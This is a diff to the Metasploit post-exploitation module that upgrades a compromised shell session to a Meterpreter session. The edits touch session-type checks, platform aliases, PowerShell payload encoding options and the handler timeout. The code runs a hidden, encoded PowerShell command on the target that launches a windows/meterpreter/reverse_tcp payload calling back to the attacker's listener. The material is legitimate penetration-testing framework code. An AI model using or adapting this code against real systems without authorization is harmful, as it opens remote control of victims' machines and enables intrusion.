@@ -2,9 +2,7 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core/exploit/powershell'
-require 'msf/core/post/windows/powershell'
+require 'rex/exploitation/cmdstager'
 
 class MetasploitModule < Msf::Post
   include Exploit::Powershell
@@ -52,6 +50,11 @@ class MetasploitModule < Msf::Post
   def run
     print_status("Upgrading session ID: #{datastore['SESSION']}")
 
+    if session.type == 'meterpreter'
+      print_error("Meterpreter sessions cannot be upgraded any higher")
+      return nil
+    end
+
     # Try hard to find a valid LHOST value in order to
     # make running 'sessions -u' as robust as possible.
     if datastore['LHOST']
@@ -73,7 +76,7 @@ class MetasploitModule < Msf::Post
 
     # Handle platform specific variables and settings
     case session.platform
-    when 'windows'
+    when 'windows', 'win'
       platform = 'windows'
       payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
@@ -157,10 +160,13 @@ class MetasploitModule < Msf::Post
 
         encoded_psh_payload = encode_script(psh_payload)
         cmd_exec(run_hidden_psh(encoded_psh_payload, psh_arch, true))
-      else # shell
+      else
         if (have_powershell?) && (datastore['WIN_TRANSFER'] != 'VBS')
           vprint_status("Transfer method: Powershell")
-          psh_opts = { :prepend_sleep => 1, :encode_inner_payload => true, :persist => false }
+          psh_opts = { :encode_final_payload => true, :persist => false, :prepend_sleep => 1 }
+          unless session.type == 'shell'
+            psh_opts[:remove_comspec] = true
+          end
           cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
         else
           print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
@@ -265,8 +271,9 @@ class MetasploitModule < Msf::Post
     framework.threads.spawn('ShellToMeterpreterUpgradeCleanup', false) {
       if !aborted
         timer = 0
-        vprint_status("Waiting up to #{HANDLE_TIMEOUT} seconds for the session to come back")
-        while !framework.jobs[listener_job_id].nil? && timer < HANDLE_TIMEOUT
+        timeout = datastore['HANDLE_TIMEOUT']
+        vprint_status("Waiting up to #{timeout} seconds for the session to come back")
+        while !framework.jobs[listener_job_id].nil? && timer < timeout
           sleep(1)
           timer += 1
         end
